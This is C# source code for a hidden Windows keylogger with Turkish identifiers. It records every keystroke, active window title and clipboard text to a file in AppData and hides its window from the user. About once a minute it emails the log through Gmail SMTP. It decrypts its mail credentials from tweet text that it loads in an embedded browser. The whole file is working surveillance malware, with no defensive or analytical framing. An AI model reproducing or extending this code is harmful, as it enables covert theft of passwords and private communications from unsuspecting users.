using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Logger
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            CheckForIllegalCrossThreadCalls = false;
            tmrTusKayit.Interval = 1;
            tmrTusKayit.Tick += TmrTusKayit_Tick;
            webBrowser1.ScriptErrorsSuppressed = true;
            bgw.WorkerSupportsCancellation = true;
            CheckForIllegalCrossThreadCalls = false;
        }
        
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        public System.Windows.Forms.Timer tmrTusKayit = new System.Windows.Forms.Timer();
        static string Email = ""; 
        static string Sifre = ""; 
        static string gonEmail = ""; 
        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
        string AktifPencere()
        {
            int chars = 256;
            StringBuilder buff = new StringBuilder(chars);
            IntPtr handle = GetForegroundWindow();
            if (GetWindowText(handle, buff, chars) > 0)
            {
                return buff.ToString();
            }
            return null;
        }
        private void TmrTusKayit_Tick(object sender, EventArgs e)
        {
            if (!bgw.IsBusy || bgw.CancellationPending == true)
            {
                bgw.RunWorkerAsync();
            }
        }
        protected override CreateParams CreateParams
        {
            get
            {
                var cp = base.CreateParams;
                cp.ExStyle |= 0x80;  
                return cp;
            }
        }
        void Sil()
        {
            FileStream fs = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/application.txt", FileMode.Create, FileAccess.Write);

            StreamWriter sw = new StreamWriter(fs);
            sw.Write("");
            sw.Flush();
            fs.Close();
        }
        string KopyalananMetinler()
        {
            try
            {
                string clipboardData = null;
                Exception threadEx = null;
                Thread staThread = new Thread(
                    delegate ()
                    {
                        try
                        {
                            clipboardData = Clipboard.GetText(TextDataFormat.Text);
                        }

                        catch (Exception ex)
                        {
                            threadEx = ex;
                        }
                    });
                staThread.SetApartmentState(ApartmentState.STA);
                staThread.Start();
                staThread.Join();
                return clipboardData;
            }
            catch (Exception exception)
            {
                return string.Empty;
            }
        }
        string AktifOncekiPencere = string.Empty;
        string BeforeClipBoard=string.Empty;
        void TusKaydet(object tus)
        {
            string TusAd = tus.ToString();
            TusAd = TusAd.Replace("Space", "(SPACE)");
            TusAd = TusAd.Replace("Delete", "(DELETE)");
            TusAd = TusAd.Replace("LShiftKey", "(SHIFT)");
            TusAd = TusAd.Replace("ShiftKey", "");
            TusAd = TusAd.Replace("OemQuotes", "(!)");
            TusAd = TusAd.Replace("Oemcomma", "(?)");
            TusAd = TusAd.Replace("Back", "(<==)");
            TusAd = TusAd.Replace("LButton", "");
            TusAd = TusAd.Replace("RButton", "");
            TusAd = TusAd.Replace("NumPad", "");
            TusAd = TusAd.Replace("OemPeriod", "(.)");
            TusAd = TusAd.Replace("OemSemicolon", "(ů)");
            TusAd = TusAd.Replace("Oem4", "/");
            TusAd = TusAd.Replace("Oem1", "Ş");
            TusAd = TusAd.Replace("OemQuestion", "Ö");
            TusAd = TusAd.Replace("OemOpenBrackets", "Ğ");
            TusAd = TusAd.Replace("Oem6", "Ü");
            TusAd = TusAd.Replace("Oem7", "İ");
            TusAd = TusAd.Replace("LControlKey", "");
            TusAd = TusAd.Replace("ControlKey", "(CTRL)");
            TusAd = TusAd.Replace("Enter", "");
            TusAd = TusAd.Replace("Shift", "(SHIFT)");
            TusAd = TusAd.Replace("Return", "(ENTER)");
            TusAd = TusAd.ToLower();
            TusAd = TusAd.Replace(" ", "");
            if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/application.txt"))

                using (var fs = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/application.txt", FileMode.Append, FileAccess.Write))
                {

                    using (StreamWriter sw = new StreamWriter(fs))
                    {
                        sw.Write(TusAd);
                        if (AktifPencere() != AktifOncekiPencere)
                        {
                            sw.Write("\r\nAktif pencerede adı : " + AktifPencere() + "\r\n");
                            AktifOncekiPencere = AktifPencere();
                        }
                        if (KopyalananMetinler() != BeforeClipBoard)
                        {
                            sw.Write("\r\n KOPYALANMIŞ METİN : " + KopyalananMetinler() + "\r\n");
                            BeforeClipBoard = KopyalananMetinler();
                        }
                        sw.Flush();
                        sw.Close();
                        fs.Close();
                    }
                }

            else
                using (var fs = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/application.txt", FileMode.CreateNew, FileAccess.Write))
                {
                    using (StreamWriter sw = new StreamWriter(fs))
                    {
                        sw.Write(TusAd);
                        if (AktifPencere() != AktifOncekiPencere)
                        {
                            sw.Write("\r\nAktif pencerede adı : " + AktifPencere() + "\r\n");
                            AktifOncekiPencere = AktifPencere();
                            if (KopyalananMetinler() != BeforeClipBoard)
                            {
                                sw.Write("\r\n KOPYALANMIŞ METİN : " + KopyalananMetinler() + "\r\n");
                                BeforeClipBoard = KopyalananMetinler();
                            }
                        }
                        sw.Flush();
                        sw.Close();
                        fs.Close();
                    }
                }

        }
        MailMessage ePosta;
        void MailGonder()
        {
            ePosta = new MailMessage();
            ePosta.From = new MailAddress(gonEmail, "LOG");
            ePosta.To.Add(gonEmail);
            ePosta.Subject = "Logger";
            ePosta.Attachments.Add(new Attachment(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"/application.txt"));
            SmtpClient smtp = new SmtpClient();
            smtp.Credentials = new System.Net.NetworkCredential(Email,Sifre);
            smtp.Port = 587;
            smtp.Host = "smtp.gmail.com";
            smtp.EnableSsl = true;
            object userState = ePosta;
            try
            {
                smtp.SendCompleted += Smtp_SendCompleted;
                smtp.SendAsync(ePosta, (object)ePosta);
            }
            catch (SmtpException ex)
            {
               
            }
        }
        DateTime Suan;
        DateTime Once = DateTime.Now;
        TimeSpan Fark;
        private void Smtp_SendCompleted(object sender, System.ComponentModel.AsyncCompletedEventArgs e)
        {
            if (e.Error != null)
            {
            }
            else if (e.Cancelled)
            {
            }
            else
            {
                
                ePosta.Attachments.Dispose();
                Sil();
                tmrTusKayit.Start();
                bgw.CancelAsync();
            }
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            this.ShowInTaskbar = false;
            this.Opacity = 0;
        }
        List<string> MD5 = new List<string>();
        private void webBrowser1_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
        {
            tmrTusKayit.Start();
            HtmlElementCollection theElementCollection = default(HtmlElementCollection);
            theElementCollection = webBrowser1.Document.GetElementsByTagName("p");
            foreach (HtmlElement curElement in theElementCollection)
            {
                if (curElement.GetAttribute("className").ToString() == "TweetTextSize TweetTextSize--normal js-tweet-text tweet-text")
                {
                    MD5.Add(curElement.GetAttribute("InnerText"));
                }
            }
            Sifre = Cryp.Decrypt(MD5[0], true);
            Email = Cryp.Decrypt(MD5[1], true);
            gonEmail = Cryp.Decrypt(MD5[1], true);
        }

        private void bgw_DoWork(object sender, System.ComponentModel.DoWorkEventArgs e)
        {
            Suan = DateTime.Now;
            Fark = Suan - Once;
            if (Fark.Minutes == 1) { Once = DateTime.Now; tmrTusKayit.Stop(); MailGonder(); if (bgw.CancellationPending == true) { e.Cancel = true; return; } }
            for (int i = 0; i < 255; i++)
            {
                int keyState = GetAsyncKeyState(i);
                if (keyState == 1 || keyState == -32767)
                {
                    TusKaydet((Keys)i);
                    break;
                }
            }
        }

        private void bgw_RunWorkerCompleted(object sender, System.ComponentModel.RunWorkerCompletedEventArgs e)
        {
            tmrTusKayit.Start();
        }
    }
}
